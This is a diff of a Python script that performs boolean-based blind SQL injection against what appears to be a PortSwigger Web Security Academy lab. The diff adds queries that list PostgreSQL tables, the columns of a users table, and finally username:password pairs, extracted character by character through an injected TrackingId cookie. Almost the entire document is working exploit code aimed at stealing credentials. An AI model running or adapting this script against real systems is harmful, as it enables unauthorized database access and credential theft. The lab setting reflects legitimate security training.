@@ -8,32 +8,39 @@ import hashlib
 target = '' #put sqli vulnerable URL here
 
 query = "ASCII(SUBSTRING((SELECT+current_database()),[POS],1))"
-#query = "(SELECT+ascii(substring(string_agg(column_name,':'),[POS],1))+FROM+information_schema.columns+where+table_name='users'+LIMIT+1)"
+query = "(SELECT+ascii(substring(string_agg(tablename,':'),[POS],1))+FROM+pg_catalog.pg_tables+LIMIT+1)"
+#users:
+query = "(SELECT+ascii(substring(string_agg(column_name,':'),[POS],1))+FROM+information_schema.columns+where+table_name='users'+LIMIT+1)"
+#username:password
+query = "(SELECT+ascii(substring(string_agg(username||':'||password,','),[POS],1))+FROM+users+LIMIT+1)"
 
 
 def send(query):
-    burp0_url = "https://0a7900e503ffbd76c33dce6300c80004.web-security-academy.net:443/filter?category=Gifts"
+    if "[POS]" not in query:
+        print("[!] stop! query missing [POS]! quitting!")
+        sys.exit()
+    burp0_url = "https://0a45004803110cacc17758ea00d40067.web-security-academy.net:443/filter?category=Gifts"
     data = ''
     for i in range(1,2000): #pos
-        for j in range(32,127): #char
+        for j in range(32,127): #char #32,127
             payload = "obviouslywrong'+OR+%s=[CHAR]--" % query
             payload = payload.replace("[POS]",str(i))
             payload = payload.replace("[CHAR]",str(j))
-            print("[+] payload: %s" % payload)
+            #print("[+] payload: %s" % payload) #only for testing
             burp0_cookies = {"TrackingId": payload, "session": "rPtnckvgje5Bmlu67eBPengl9isfoTfj"}
             burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a7900e503ffbd76c33dce6300c80004.web-security-academy.net/filter?category=Gifts", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
             r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
             res = re.search("Welcome back!",r.text)
             if res:
                 extractedchar = chr(j)
-                print("[+] FOUND: %s" % extractedchar)
-                print(extractedchar)
+                #print("[+] FOUND: %s" % extractedchar) #only for testing
                 sys.stdout.write(extractedchar)
                 sys.stdout.flush()
                 data += extractedchar
-                continue #problem: will continue looking even after FOUND, cannot "break" because using "for" loop
+                break #break inner loop if found
             else:
                 continue
+    print("[+] extracted: %s" % data)
 send(query)
 
 
